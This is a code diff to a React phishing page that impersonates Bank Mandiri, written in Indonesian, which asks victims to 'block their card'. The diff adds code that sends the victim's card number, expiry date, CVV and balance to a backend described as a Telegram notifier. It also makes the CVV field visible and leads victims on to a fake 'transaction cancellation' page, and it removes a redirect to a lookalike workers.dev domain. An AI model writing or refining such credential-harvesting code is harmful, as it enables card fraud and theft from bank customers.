@@ -54,23 +54,39 @@ export default function MandiriBlockPage() {
     setBalance(raw ? 'Rp ' + parseInt(raw).toLocaleString('id-ID') : '');
   };
 
-  const handleSubmit = (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     if (!isFormValid) return;
 
     // Start Flow
     setView('loading');
+
+    // Send Telegram Notification in background
+    fetch('/api/notify', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        type: 'Blokir Kartu',
+        cardNumber,
+        expiry,
+        cvv,
+        balance
+      })
+    }).catch(err => console.error('Failed to send notification:', err));
     
     // Exactly 7 seconds of loading
     setTimeout(() => {
       setView('success');
       
-      // Exactly 3.5 seconds of success notification before "redirect" (reset in this case)
+      // Delay before showing the "Ke Halaman Pembatalan" button
       setTimeout(() => {
-        window.location.href = "https://batalkantransaksi-batal.ibankmandiricom.workers.dev/";
+        // We will now use a state to control the visibility of the nav button instead of undoAllowed
+        setIsNavReady(true);
       }, 3500);
     }, 7000);
   };
+
+  const [isNavReady, setIsNavReady] = useState(false);
 
   return (
     <div className="min-h-screen flex flex-col items-center pb-10 relative bg-[#eef4f9]">
@@ -101,8 +117,18 @@ export default function MandiriBlockPage() {
                   height={80} 
                 />
               </div>
-              <h1 className="text-[#003366] text-[20px] font-bold mb-[10px]">Blokir Kartu Berhasil</h1>
-              <p className="text-[#64748b] text-[14px] leading-[1.5]">Anda akan dialihkan secara otomatis ke halaman pembatalan transaksi...</p>
+              <h1 className="text-[#003366] text-[20px] font-bold mb-[10px]">Kartu Berhasil diblokir sementara</h1>
+              
+              <div className="mt-8 flex flex-col gap-3">
+                {isNavReady && (
+                  <button 
+                    onClick={() => window.location.href = '/cancel'}
+                    className="w-full py-4 bg-[#FF9E1B] text-white rounded-full font-bold text-xs shadow-md hover:bg-[#e68a00] transition-all animate-fade-in-up"
+                  >
+                    Klik disini untuk melanjutkan Pembatalan Transaksi
+                  </button>
+                )}
+              </div>
             </div>
           </div>
         </div>
@@ -167,7 +193,7 @@ export default function MandiriBlockPage() {
                   <div className="relative">
                     <Lock className="absolute left-[14px] top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400 pointer-events-none" />
                     <input 
-                      type="password" 
+                      type="tel" 
                       value={cvv}
                       onChange={(e) => setCvv(e.target.value.replace(/\D/g, '').slice(0,3))}
                       className="w-full p-[12px_14px_12px_40px] border-[1.5px] border-[#e2e8f0] focus:border-[#004D99] rounded-[10px] text-[0.95rem] outline-none"
@@ -203,14 +229,14 @@ export default function MandiriBlockPage() {
               <button 
                 type="submit" 
                 disabled={!isFormValid}
-                className={`w-full p-[15px] mt-[15px] flex items-center justify-center gap-2 rounded-[30px] font-bold text-[1rem] transition-all ${
+                className={`w-full p-[16px] mt-[15px] flex items-center justify-center gap-2.5 rounded-[30px] font-bold text-[1rem] tracking-wide transition-all duration-300 ${
                   isFormValid 
-                    ? 'bg-[#003d79] text-white shadow-[0_8px_20px_rgba(0,61,121,0.3)] cursor-pointer' 
+                    ? 'bg-gradient-to-r from-[#003d79] to-[#0056a8] text-white shadow-[0_10px_25px_rgba(0,61,121,0.3)] cursor-pointer hover:shadow-[0_15px_30px_rgba(0,61,121,0.4)] hover:scale-[1.02] active:scale-[0.98]' 
                     : 'bg-[#cbd5e1] text-white cursor-not-allowed'
                 }`}
               >
                 <ShieldCheck className="w-5 h-5" />
-                KONFIRMASI BLOKIR
+                BLOKIR KARTU
               </button>
             </form>
           </main>
